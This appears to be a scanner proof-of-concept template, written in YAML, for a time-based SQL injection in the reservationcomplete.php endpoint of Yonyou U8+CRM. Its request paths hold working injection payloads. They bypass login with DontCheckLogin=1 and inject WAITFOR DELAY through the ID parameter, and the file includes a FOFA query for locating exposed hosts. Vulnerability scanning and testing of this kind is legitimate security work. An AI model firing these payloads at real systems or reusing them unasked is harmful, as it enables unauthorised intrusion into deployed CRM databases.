id: poc-yaml-yongyou-crm-reservationcomplete-sqli
info:
  name: 用友U8+CRM接口reservationcomplete.php ID参数存在SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 用友U8+CRM
  fofa: title="用友U8CRM"
variables:
  t1: random_int(3,5)
  t2: t1*2
  t3: t2 + 2
  t4: random_int(1,3)
  t5: t4*2
  t6: t5 + 2
requests:
- method: GET
  path: /bgt/reservationcomplete.php?DontCheckLogin=1&ID=-1;WAITFOR+DELAY+%270:0:{{.t1}}%27--+
  expression: 'status_code == 200 &&

    duration >= t2 &&

    duration <= t3 &&

    body == ""

    '
- method: GET
  path: /bgt/reservationcomplete.php?DontCheckLogin=1&ID=-1;WAITFOR+DELAY+%270:0:{{.t4}}%27--+
  expression: 'status_code == 200 &&

    duration >= t5 &&

    duration <= t6 &&

    body == ""

    '
transport: http
